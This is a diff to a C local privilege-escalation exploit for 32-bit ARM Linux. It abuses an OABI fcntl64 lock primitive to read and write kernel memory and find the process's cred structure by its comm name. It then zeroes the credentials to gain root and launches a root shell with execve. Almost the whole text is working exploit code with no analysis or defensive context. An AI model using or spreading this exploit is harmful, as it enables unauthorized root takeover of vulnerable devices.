@@ -19,7 +19,7 @@
 #include <sys/utsname.h>
 #include <sys/ptrace.h>
 
-
+#define KENEL_BASE 0xc0208000
 #define F_OFD_GETLK	36
 #define F_OFD_SETLK	37
 #define F_OFD_SETLKW 38
@@ -43,7 +43,7 @@ void gen_rand_str ( char *str, unsigned int len )
     unsigned int i;
 
     for ( i = 0; i < (len - 1); i++ )
-        str[i] = (rand() % (0x7e - 0x20)) + 0x20;
+        str[i] = 'Z';
 
     str[len - 1] = 0;
 }
@@ -54,6 +54,7 @@ void read_from_kernel(char* kaddr,char* addr,long size){
 	if(fork() == 0){
 		memset(map_base, 0, 0x1000);
 		map_base->l_start = SEEK_SET;
+		//puts("GOGOGO");
 		if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
 			perror("sys_oabi_fcntl64");
 			exit(0);
@@ -78,6 +79,7 @@ void write_to_kernel(char* kaddr,char* addr,long size){
 	if(fork() == 0){
 		memset(map_base, 0, 0x1000);
 		map_base->l_start = SEEK_SET;
+		//puts("GOGOGO");
 		if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
 			perror("sys_oabi_fcntl64");
 			exit(0);
@@ -101,8 +103,7 @@ int main(int argc, char const *argv[]){
 	char comm[0x10], addr[0x1000],val[0x20];
 	memset(val,0,sizeof(val));
 	fd = open("/proc/cpuinfo", O_RDONLY);
-	
-	
+		
 	if(fd == -1){
 		perror("open");
 		return -1;
@@ -113,14 +114,14 @@ int main(int argc, char const *argv[]){
 		exit(0);
 	}
 	
-	srand(time(NULL));
+	//srand(time(NULL));
 	gen_rand_str(comm, sizeof(comm));
 	prctl(PR_SET_NAME, comm);
 	
 	char* ceiling = &addr[0]+0x1000;
 	
 	for(long offset=0;;offset+=0x1000){
-		read_from_kernel((char*)(0xc0208000+offset),addr,0x1000);
+		read_from_kernel((char*)(KENEL_BASE+offset),addr,0x1000);
 		unsigned long *search = (unsigned long *)addr;
 
         while ( (unsigned long)search < (unsigned long)ceiling )
@@ -130,17 +131,18 @@ int main(int argc, char const *argv[]){
             if ( search == NULL )
                 break;
 
-            if ( (search[-2] > 0xc0208000) && (search[-1] > 0xc0208000 ) )
+            if ( (search[-2] > KENEL_BASE) && (search[-1] > KENEL_BASE ) )
             {
                 unsigned long real_cred, cred;
 
                 real_cred = search[-2];
                 cred = search[-1];
-                printf("cred = %p\n", (void *)cred);
+              
 
                 write_to_kernel((char*)(cred+0x4),val,sizeof(val));
 				if( getuid() == 0){
-					system("/bin/sh");
+					char* arg[]={"sh",NULL};
+					execve("/bin/sh",arg,0);
 				}
 				
             }
